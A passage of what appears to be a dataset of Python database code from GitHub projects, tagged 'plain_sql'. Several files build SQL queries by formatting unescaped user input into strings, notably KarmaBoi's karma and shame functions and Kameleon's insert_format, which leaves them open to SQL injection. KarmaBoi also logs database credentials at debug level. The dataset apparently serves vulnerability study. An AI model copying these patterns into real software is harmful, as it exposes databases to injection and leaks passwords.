PrimaryKeyField\nfrom referenceField import ReferenceField\n\nclass ForeignKeyField(Field):\n\n    def __init__(self, rel_model, reference=None, related_name=None, on_delete=False, on_update=False, *args, **kwargs):\n        super(ForeignKeyField, self).__init__(*args, **kwargs)\n\n        self.rel_model = rel_model\n        self.reference = reference or rel_model._meta.fields[\"id\"]\n        self.related_name = related_name\n        self.on_delete = on_delete\n        self.on_update = on_update\n\n    def add_to_model(self, model_class, name):\n        self.name = name\n        self.model_class = model_class\n\n        self.related_name = self.related_name or \"%ss\"%(model_class._meta.name)\n\n        model_class._meta.add_field(self)\n\n        if self.related_name in self.rel_model._meta.fields:\n            print(\"ERROR: Foreign key conflict\")\n\n        if self.related_name in self.rel_model._meta.reverse_rel:\n            print(\"ERROR: Foreign key %s already exists on model %s\"%(self.related_name, model_class._meta.name))\n\n        self.model_class._meta.rel[self.name] = self\n        self.model_class._meta.rel_class[self.rel_model] = self\n\n        reference = ReferenceField(self.model_class)\n        reference.add_to_model(self.rel_model, self.related_name, self.name)\n\n    def create_field(self, name):\n        _type = self.reference.get_db_field()\n        field_string = \"%s %s REFERENCES %s(%s)\" %(self.name, _type, self.rel_model._meta.table_name, self.reference.name)\n\n        if self.on_delete:\n            field_string += \" ON DELETE CASCADE\"\n\n        if self.on_update:\n            field_string += \" ON UPDATE CASCADE\"\n\n        if self.unique:\n            field_string += \" UNIQUE\"\n\n        return field_string\n\n    def insert_format(self, value):\n        value = u\"'{0}'\".format(value)\n        return value\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ThinkEE/Kameleon/blob/d4bf00e29d3b55191c8bc7880d298ced4e43bfd8",
        "file_path": "/kameleon/model/fields/integerField.py",
        "source": "################################################################################\n# MIT License\n#\n# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n################################################################################\n\nfrom base import Field\n\nclass IntegerField(Field):\n    TYPE = 'INT'\n\n    def __init__(self, *args, **kwargs):\n        super(IntegerField, self).__init__(*args, **kwargs)\n\n    def create_field(self, name):\n        field_string = \"%s int\" %(str(name))\n\n        if self.unique:\n            field_string += \" UNIQUE\"\n\n        return field_string\n\n    def insert_format(self, value):\n        value = u\"'{0}'\".format(value)\n        return value\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ThinkEE/Kameleon/blob/d4bf00e29d3b55191c8bc7880d298ced4e43bfd8",
        "file_path": "/kameleon/model/fields/jsonField.py",
        "source": "################################################################################\n# MIT License\n#\n# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n################################################################################\n\nfrom base import Field\n\nclass JsonField(Field):\n    TYPE = 'JSON'\n\n    def __init__(self, *args, **kwargs):\n        super(JsonField, self).__init__(*args, **kwargs)\n\n    def create_field(self, name):\n        field_string = (\"{0} {1}\"\n                        .format(name,\n                            self.model_class._meta.database.TYPES[self.TYPE]))\n\n        return field_string\n\n    def insert_format(self, value):\n        value = u\"'{0}'\".format(value)\n        return value\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ThinkEE/Kameleon/blob/d4bf00e29d3b55191c8bc7880d298ced4e43bfd8",
        "file_path": "/kameleon/model/fields/primaryKeyField.py",
        "source": "################################################################################\n# MIT License\n#\n# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n################################################################################\n\nfrom base import Field\n\nclass PrimaryKeyField(Field):\n    name = \"id\"\n    TYPE = 'INT'\n\n    def __init__(self, name=None, *args, **kwargs):\n        super(PrimaryKeyField, self).__init__(*args, **kwargs)\n\n    def create_field(self, name):\n        field_string = \"id SERIAL PRIMARY KEY\"\n        return field_string\n\n    def insert_format(self, value):\n        value = u\"'{0}'\".format(value)\n        return value\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ThinkEE/Kameleon/blob/d4bf00e29d3b55191c8bc7880d298ced4e43bfd8",
        "file_path": "/kameleon/model/fields/timestampField.py",
        "source": "################################################################################\n# MIT License\n#\n# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n################################################################################\n\nfrom base import Field\n\nclass TimestampField(Field):\n    TYPE = 'DATE'\n\n    def __init__(self, *args, **kwargs):\n        super(TimestampField, self).__init__(*args, **kwargs)\n\n    def create_field(self, name):\n        field_string = \"%s timestamp\" %(str(name))\n        return field_string\n\n    def insert_format(self, value):\n        value = u\"'{0}'\".format(value)\n        return value\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ThinkEE/Kameleon/blob/d4bf00e29d3b55191c8bc7880d298ced4e43bfd8",
        "file_path": "/kameleon/model/query/insertQuery.py",
        "source": "################################################################################\n# MIT License\n#\n# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n################################################################################\n\nfrom twisted.internet.defer import inlineCallbacks, returnValue\n\nfrom base import Query\n\nclass InsertQuery(Query):\n    \"\"\"\n    Object representing an insert query\n    \"\"\"\n\n    def __init__(self, model_class, values):\n        super(InsertQuery, self).__init__(model_class)\n        # Values to update\n        self.values = values\n\n        # XXX\n        self.on_conflict = self.model_class._meta.on_conflict\n\n        # If a model has a primary key then we will return the id\n        self.return_id = self.model_class._meta.primary_key\n\n    @inlineCallbacks\n    def execute(self):\n        query = self.database.generate_insert(self)\n\n        # If return id. Use runQuery else use runOperation\n        if self.return_id:\n            result = yield self.database.runQuery(query)\n            if result and self.model_class._meta.primary_key:\n                returnValue(result[0][0])\n        else:\n            yield self.database.runOperation(query)\n\n        returnValue(None)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ThinkEE/Kameleon/blob/d4bf00e29d3b55191c8bc7880d298ced4e43bfd8",
        "file_path": "/kameleon/model/query/updateQuery.py",
        "source": "################################################################################\n# MIT License\n#\n# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n################################################################################\n\nfrom twisted.internet.defer import inlineCallbacks, returnValue\n\nfrom base import Query\n\nclass UpdateQuery(Query):\n    \"\"\"\n    Object representing an update query\n    \"\"\"\n\n    def __init__(self, model_class, values):\n        super(UpdateQuery, self).__init__(model_class)\n        # Values to update\n        self.values = values\n        self.return_id = self.model_class._meta.primary_key\n\n    @inlineCallbacks\n    def execute(self):\n        query = self.database.generate_update(self)\n\n        # If return id. Use runQuery else use runOperation\n        if self.return_id:\n            result = yield self.database.runQuery(query)\n            if result and self.model_class._meta.primary_key:\n                returnValue(result[0][0])\n        else:\n            yield self.database.runOperation(query)\n\n        returnValue(None)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tylarb/KarmaBoi-PCF/blob/1ee6b55522695b304c84e4a57fb1972f6b3e76b4",
        "file_path": "/KarmaBoi/dbopts.py",
        "source": "'''\nAll DB operations, including connection to the appropriate DB, are handled here.\n\nReleased under MIT license, copyright 2018 Tyler Ramer\n'''\n\nimport sqlite3\nimport os\nimport logging\nfrom cfenv import AppEnv\nimport psycopg2\n\n#import mysql.connector\n#from mysql.connector import errorcode\n\nDB_NAME = 'karmadb'\nenv = AppEnv()\nlogger = logging.getLogger(__name__)\nSERVICE_LABLE = 'elephantsql'\n'''\nCheck what env we have - if on PCF, use mysql connector. Otherwise, we can\nuse sqlite to build our database. Fortunately, command execution libraries\nare identical once we have a cursor.\n'''\n\nif env.name == None:\n    DB_PATH = os.path.expanduser(\"~/.KarmaBoi/databases/\")\n    DB_NAME = 'karmadb'\n    PEOPLE_TABLE = '''\n    CREATE TABLE IF NOT EXISTS people(id SERIAL PRIMARY KEY,\n    name TEXT, karma INTEGER, shame INTEGER)'''\n    ALSO_TABLE = '''\n    CREATE TABLE IF NOT EXISTS isalso(id SERIAL PRIMARY KEY,\n    name TEXT, also TEXT)\n    '''\nelse:\n    try:\n        db_env = env.get_service(\n            label=SERVICE_LABLE)  # probably can bind any db by adjusting lable\n        db_creds = db_env.credentials\n        db_config = {\n            'user': db_creds.get('username'),\n            'password': db_creds.get('password'),\n            'host': db_creds.get('hostname'),\n            'port': db_creds.get('port'),\n            'database': db_creds.get('name')\n        }\n        db_uri = db_creds.get('uri')\n    except:\n        logger.critical(\n            'not able to generate db_env - ensure db is bound and lable is correct'\n        )\n        raise\n    PEOPLE_TABLE = '''\n    CREATE TABLE IF NOT EXISTS people(id SERIAL PRIMARY KEY,\n    name TEXT, karma INTEGER, shame INTEGER)\n    ''' # currently, specific to postgres\n    ALSO_TABLE = '''\n    CREATE TABLE IF NOT EXISTS isalso(id SERIAL PRIMARY KEY,\n    name TEXT, also TEXT)\n    '''\n'''\nPossible db connect class\nclass db_connect:\n    def __init__(self):\n        try:\n            logger.debug('Connecting to db service')\n            self.cnx = psycopg2.connect(db_uri)\n            return self.cnx\n        except Exception as e:\n            if e.errno == errorcode.ER_ACCESS_DENIED_ERROR:\n                logger.error('Username or password is incorrect')\n                raise Exception('Could not connect, bad user or pwd')\n            else:\n                logger.error(\n                    'Could not connect to DB for some other reason: {}'.format(\n                        err))\n\n    def __exit__(self):\n        cnx.close()\n\n\n'''\n\n\ndef db_connect():\n    if env.name == None:\n        logger.debug('Local install, attempting to connect to sqlite DB')\n        if not os.path.exists(DB_PATH + 'karmadb'):\n            logger.info(\n                'No database exists. Creating databases for the first time')\n            if not os.path.exists(DB_PATH):\n                os.makedirs(DB_PATH)\n            db = sqlite3.connect(DB_PATH + DB_NAME)\n            create_karma_table()\n            create_also_table()\n            return db\n        else:\n            try:\n                db = sqlite3.connect(DB_PATH + DB_NAME)\n                return db\n            except Exception as e:\n                logger.error('db connection to sqlite was not successful')\n                logger.Exception\n                raise\n    else:\n        try:\n            logger.debug('Detected Cloud Foundry, connecting to db service')\n            logger.debug('db_config: {}'.format(db_config))\n            logger.debug('db_uri: {}'.format(db_uri))\n            cnx = psycopg2.connect(db_uri)\n            return cnx\n        except Exception as e:\n            if e.errno == errorcode.ER_ACCESS_DENIED_ERROR:\n                logger.error('Username or password is incorrect')\n                raise Exception('Could not connect, bad user or pwd')\n            else:\n                logger.error(\n                    'Could not connect to DB for some other reason: {}'.format(\n                        err))\n\n\ndef check_tables():\n    db = db_connect()\n    cursor = db.cursor()\n    try:\n        cursor.execute('''\n            SELECT 1 FROM people LIMIT 1;\n            ''')\n        cursor.fetchone()\n        logger.debug('people table exists')\n    except:\n        raise\n    try:\n        cursor.execute('''\n            SELECT 1 FROM people LIMIT 1;\n            ''')\n        cursor.fetchone()\n        logger.debug('people table exists')\n    except:\n        raise\n\n\ndef create_karma_table():\n    db = db_connect()\n    cursor = db.cursor()\n    cursor.execute(PEOPLE_TABLE)\n    db.commit()\n    logger.info('successfully created karma db for the first time')\n\n\ndef create_also_table():\n    db = db_connect()\n    cursor = db.cursor()\n    cursor.execute(ALSO_TABLE)\n    db.commit()\n    logger.info('successfully created also table for the first time')\n\n\n## Karma functions\ndef karma_ask(name):\n    db = db_connect()\n    cursor = db.cursor()\n    try:\n        cursor.execute(\n            ''' SELECT karma FROM people WHERE name='{}' '''.format(name))\n        karma = cursor.fetchone()\n        if karma is None:\n            logger.debug('No karma found for name {}'.format(name))\n            db.close()\n            return karma\n        else:\n            karma = karma[0]\n            logger.debug('karma of {} found for name {}'.format(karma, name))\n            db.close()\n            return karma\n    except Exception as e:\n        logger.error('Execution failed with error: {}'.format(e))\n        raise\n\n\ndef karma_rank(name):\n    db = db_connect()\n    cursor = db.cursor()\n    try:\n        cursor.execute('''\n            SELECT (SELECT COUNT(*) FROM people AS t2 WHERE t2.karma > t1.karma)\n            AS row_Num FROM people AS t1 WHERE name='{}'\n        '''.format(name))\n        rank = cursor.fetchone()[0] + 1\n        logger.debug('Rank of {} found for name {}'.format(rank, name))\n        db.close()\n        return rank\n    except Exception as e:\n        logger.error('Execution failed with error: {}'.format(e))\n        raise\n\n\ndef karma_add(name):\n    karma = karma_ask(name)\n    db = db_connect()\n    cursor = db.cursor()\n    if karma is None:\n        try:\n            cursor.execute('''\n                INSERT INTO people(name,karma,shame) VALUES('{}',1,0)\n                '''.format(name))\n            db.commit()\n            logger.debug('Inserted into karmadb 1 karma for {}'.format(name))\n            return 1\n        except Exception as e:\n            logger.error('Execution failed with error: {}'.format(e))\n            raise\n    else:\n        karma = karma + 1\n        try:\n            cursor.execute('''\n                UPDATE people SET karma = {0} WHERE name = '{1}'\n                '''.format(karma, name))\n            db.commit()\n            logger.debug('Inserted into karmadb {} karma for {}'.format(\n                karma, name))\n            return karma\n\n        except Exception as e:\n            logger.error('Execution failed with error: {}'.format(e))\n            raise\n    db.close()\n\n\ndef karma_sub(name):\n    karma = karma_ask(name)\n    db = db_connect()\n    cursor = db.cursor()\n    if karma is None:\n        try:\n            cursor.execute('''\n                INSERT INTO people(name,karma,shame) VALUES('{}',-1,0)\n                '''.format(name))\n            db.commit()\n            logger.debug('Inserted into karmadb -1 karma for {}'.format(name))\n            db.close()\n            return -1\n\n        except Exception as e:\n            logger.error('Execution failed with error: {}'.format(e))\n            raise\n    else:\n        karma = karma - 1\n        try:\n            cursor.execute('''\n                UPDATE people SET karma = {0} WHERE name = '{1}'\n                '''.format(karma, name))\n            db.commit()\n            logger.debug('Inserted into karmadb -1 karma for {}'.format(name))\n            db.close()\n            return karma\n        except Exception as e:\n            logger.error('Execution failed with error: {}'.format(e))\n            raise\n\n\ndef karma_top():\n    db = db_connect()\n    cursor = db.cursor()\n    try:\n        cursor.execute(\n            ''' SELECT name, karma FROM people ORDER BY karma DESC LIMIT 5 ''')\n        leaders = cursor.fetchall()\n        logger.debug('fetched top karma values')\n        db.close()\n        return leaders\n    except Exception as e:\n        logger.error('Execution failed with error: {}'.format(e))\n        raise\n\n\ndef karma_bottom():\n    db = db_connect()\n    cursor = db.cursor()\n    try:\n        cursor.execute(\n            ''' SELECT name, karma FROM people ORDER BY karma ASC LIMIT 5 ''')\n        leaders = cursor.fetchall()\n        logger.debug('fetched bottom karma values')\n        db.close()\n        return leaders\n    except Exception as e:\n        logger.error('Execution failed with error: {}'.format(e))\n        raise\n\n\n## Shame functions\n\n\ndef shame_ask(name):\n    db = db_connect()\n    cursor = db.cursor()\n    try:\n        cursor.execute('''\n            SELECT shame FROM people WHERE name='{}'\n            '''.format(name))\n        shame = cursor.fetchone()\n        db.close()\n        if shame is None:\n            logger.debug('No shame found for name {}'.format(name))\n            return shame\n        else:\n            shame = shame[0]\n            logger.debug('shame of {} found for name {}'.format(shame, name))\n            return shame\n    except Exception as e:\n        logger.error('Execution failed with error: {}'.format(e))\n        raise\n\n\ndef shame_add(name):\n    shame = shame_ask(name)\n    db = db_connect()\n    cursor = db.cursor()\n    if shame is None:\n        try:\n            cursor.execute('''\n                INSERT INTO people(name,karma,shame) VALUES('{}',0,1)\n                '''.format(name))\n            db.commit()\n            logger.debug('Inserted into karmadb 1 shame for {}'.format(name))\n            db.close()\n            return 1\n        except Exception as e:\n            logger.error('Execution failed with error: {}'.format(e))\n            raise\n\n    else:\n        shame = shame + 1\n        try:\n            cursor.execute('''\n                UPDATE people SET shame = {0} WHERE name = '{1}'\n                '''.format(shame, name))\n            db.commit()\n            logger.debug('Inserted into karmadb {} shame for {}'.format(\n                shame, name))\n            db.close()\n            return shame\n        except Exception as e:\n            logger.error('Execution failed with error: {}'.format(e))\n            raise\n\n\ndef shame_top():\n    db = db_connect()\n    cursor = db.cursor()\n    try:\n        cursor.execute(\n            ''' SELECT name, shame FROM people ORDER BY shame DESC LIMIT 5 ''')\n        leaders = cursor.fetchall()\n        logger.debug('fetched top shame values')\n        return leaders\n    except Exception as e:\n        logger.error('Execution failed with error: {}'.format(e))\n        raise\n\n\n# WIP add quotes somewhere in here\n\n\n# \"is also\" table functions\ndef also_add(name, also):\n    db = db_connect()\n    cursor = db.cursor()\n    try:\n        cursor.execute('''\n            INSERT INTO isalso(name,also) VALUES('{}','{}')\n            '''.format(name, also))\n        db.commit()\n        logger.debug('added to isalso name {} with value {}'.format(\n            name, also))\n        db.close()\n    except Exception as e:\n        logger.error('Execution failed with error: {}'.format(e))\n        raise\n\n\ndef also_ask(name):\n    db = db_connect()\n    cursor = db.cursor()\n    if env.name == None:\n        r = 'RANDOM()'\n    else:\n        r = 'RANDOM()'\n    try:\n        cursor.execute('''\n            SELECT also FROM isalso WHERE name='{0}' ORDER BY {1} LIMIT 1\n            '''.format(name, r))\n        also = cursor.fetchone()\n        db.close()\n        if also is None:\n            logger.debug('could not find is_also for name {}'.format(name))\n            return also\n        else:\n            also = also[0]\n            logger.debug('found is_also {} for name {}'.format(also, name))\n            return also\n    except Exception as e:\n        logger.error('Execution failed with error: {}'.format(e))\n        raise\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/getsentry/snuba/blob/f38d13360fadd693b70be70632993dff32bb5a30",
        "file_path": "/snuba/clickhouse.py",
        "source": "import logging\nimport re\nimport time\n\nfrom six.moves import queue, range\n\nfrom clickhouse_driver import Client, errors\n\nfrom snuba import settings\n\n\nlogger = logging.getLogger('snuba.clickhouse')\n\n\nESCAPE_RE = re.compile(r'^-?[a-zA-Z][a-zA-Z0-9_\\.]*$')\nNEGATE_RE = re.compile(r'^(-?)(.*)$')\n\n\ndef escape_col(col):\n    if not col:\n        return col\n    elif ESCAPE_RE.match(col):\n        return col\n    else:\n        return u'{}`{}`'.format(*NEGATE_RE.match(col).groups())\n\n\nclass ClickhousePool(object):\n    def __init__(self,\n                 host=settings.CLICKHOUSE_SERVER.split(':')[0],\n                 port=int(settings.CLICKHOUSE_SERVER.split(':')[1]),\n                 connect_timeout=1,\n                 send_receive_timeout=300,\n                 max_pool_size=settings.CLICKHOUSE_MAX_POOL_SIZE,\n                 client_settings={},\n                 metrics=None,\n                 ):\n        self.host = host\n        self.port = port\n        self.connect_timeout = connect_timeout\n        self.send_receive_timeout = send_receive_timeout\n        self.client_settings = client_settings\n        self.metrics = metrics\n\n        self.pool = queue.LifoQueue(max_pool_size)\n\n        # Fill the queue up so that doing get() on it will block properly\n        for _ in range(max_pool_size):\n            self.pool.put(None)\n\n    def execute(self, *args, **kwargs):\n        try:\n            conn = self.pool.get(block=True)\n\n            # Lazily create connection instances\n            if conn is None:\n                conn = self._create_conn()\n\n            try:\n                return conn.execute(*args, **kwargs)\n            except (errors.NetworkError, errors.SocketTimeoutError) as e:\n                # Force a reconnection next time\n                conn = None\n                raise e\n        finally:\n            self.pool.put(conn, block=False)\n\n    def execute_robust(self, *args, **kwargs):\n        retries = 3\n        while True:\n            try:\n                return self.execute(*args, **kwargs)\n            except (errors.NetworkError, errors.SocketTimeoutError) as e:\n                logger.warning(\"Write to ClickHouse failed: %s (%d retries)\", str(e), retries)\n                if retries <= 0:\n                    raise\n                retries -= 1\n\n                if self.metrics:\n                    self.metrics.increment('clickhouse.network-error')\n\n                time.sleep(1)\n                continue\n            except errors.ServerException as e:\n                logger.warning(\"Write to ClickHouse failed: %s (retrying)\", str(e))\n                if e.code == errors.ErrorCodes.TOO_MANY_SIMULTANEOUS_QUERIES:\n                    if self.metrics:\n                        self.metrics.increment('clickhouse.too-many-queries')\n\n                    time.sleep(1)\n                    continue\n                else:\n                    raise\n\n    def _create_conn(self):\n        return Client(\n            host=self.host,\n            port=self.port,\n            connect_timeout=self.connect_timeout,\n            send_receive_timeout=self.send_receive_timeout,\n            settings=self.client_settings\n        )\n\n    def close(self):\n        try:\n            while True:\n                conn = self.pool.get(block=False)\n                if conn:\n                    conn.disconnect()\n        except queue.Empty:\n            pass\n\n\nclass Column(object):\n    def __init__(self, name, type):\n        self.name = name\n        self.type = type\n\n    def __repr__(self):\n        return 'Column({}, {})'.format(repr(self.name), repr(self.type))\n\n    def __eq__(self, other):\n        return self.__class__ == other.__class__ \\\n            and self.name == other.name \\\n            and self.type == other.type\n\n    def for_schema(self):\n        return '{} {}'.format(escape_col(self.name), self.type.for_schema())\n\n    @staticmethod\n    def to_columns(columns):\n        return [\n            Column(*col) if not isinstance(col, Column) else col\n            for col in columns\n        ]\n\n\nclass FlattenedColumn(object):\n    def __init__(self, base_name, name, type):\n        self.base_name = base_name\n        self.name = name\n        self.type = type\n\n        self.flattened = '{}.{}'.format(self.base_name, self.name) if self.base_name else self.name\n        self.escaped = escape_col(self.flattened)\n\n    def __repr__(self):\n        return 'FlattenedColumn({}, {}, {})'.format(\n            repr(self.base_name), repr(self.name), repr(self.type)\n        )\n\n    def __eq__(self, other):\n        return self.__class__ == other.__class__ \\\n            and self.flattened == other.flattened \\\n            and self.type == other.type\n\n\nclass ColumnType(object):\n    def __repr__(self):\n        return self.__class__.__name__ + '()'\n\n    def __eq__(self, other):\n        return self.__class__ == other.__class__\n\n    def for_schema(self):\n        return self.__class__.__name__\n\n    def flatten(self, name):\n        return [FlattenedColumn(None, name, self)]\n\n\nclass Nullable(ColumnType):\n    def __init__(self, inner_type):\n        self.inner_type = inner_type\n\n    def __repr__(self):\n        return u'Nullable({})'.format(repr(self.inner_type))\n\n    def __eq__(self, other):\n        return self.__class__ == other.__class__ \\\n            and self.inner_type == other.inner_type\n\n    def for_schema(self):\n        return u'Nullable({})'.format(self.inner_type.for_schema())\n\n\nclass Array(ColumnType):\n    def __init__(self, inner_type):\n        self.inner_type = inner_type\n\n    def __repr__(self):\n        return u'Array({})'.format(repr(self.inner_type))\n\n    def __eq__(self, other):\n        return self.__class__ == other.__class__ \\\n            and self.inner_type == other.inner_type\n\n    def for_schema(self):\n        return u'Array({})'.format(self.inner_type.for_schema())\n\n\nclass Nested(ColumnType):\n    def __init__(self, nested_columns):\n        self.nested_columns = Column.to_columns(nested_columns)\n\n    def __repr__(self):\n        return u'Nested({})'.format(repr(self.nested_columns))\n\n    def __eq__(self, other):\n        return self.__class__ == other.__class__ \\\n            and self.nested_columns == other.nested_columns\n\n    def for_schema(self):\n        return u'Nested({})'.format(u\", \".join(\n            column.for_schema() for column in self.nested_columns\n        ))\n\n    def flatten(self, name):\n        return [\n            FlattenedColumn(name, column.name, Array(column.type))\n            for column in self.nested_columns\n        ]\n\n\nclass String(ColumnType):\n    pass\n\n\nclass FixedString(ColumnType):\n    def __init__(self, length):\n        self.length = length\n\n    def __repr__(self):\n        return 'FixedString({})'.format(self.length)\n\n    def __eq__(self, other):\n        return self.__class__ == other.__class__ \\\n            and self.length == other.length\n\n    def for_schema(self):\n        return 'FixedString({})'.format(self.length)\n\n\nclass UInt(ColumnType):\n    def __init__(self, size):\n        assert size in (8, 16, 32, 64)\n        self.size = size\n\n    def __repr__(self):\n        return 'UInt({})'.format(self.size)\n\n    def __eq__(self, other):\n        return self.__class__ == other.__class__ \\\n            and self.size == other.size\n\n    def for_schema(self):\n        return 'UInt{}'.format(self.size)\n\n\nclass Float(ColumnType):\n    def __init__(self, size):\n        assert size in (32, 64)\n        self.size = size\n\n    def __repr__(self):\n        return 'Float({})'.format(self.size)\n\n    def __eq__(self, other):\n        return self.__class__ == other.__class__ \\\n            and self.size == other.size\n\n    def for_schema(self):\n        return 'Float{}'.format(self.size)\n\n\nclass DateTime(ColumnType):\n    pass\n\n\nclass ColumnSet(object):\n    \"\"\"\\\n    A set of columns, unique by column name.\n\n    Initialized with a list of Column objects or\n    (column_name: String, column_type: ColumnType) tuples.\n\n    Offers simple functionality:\n    * ColumnSets can be added together (order is maintained)\n    * Columns can be looked up by ClickHouse normalized names, e.g. 'tags.key'\n    * `for_schema()` can be used to generate valid ClickHouse column names\n      and types for a table schema.\n    \"\"\"\n    def __init__(self, columns):\n        self.columns = Column.to_columns(columns)\n\n        self._lookup = {}\n        self._flattened = []\n        for column in self.columns:\n            self._flattened.extend(column.type.flatten(column.name))\n\n        for col in 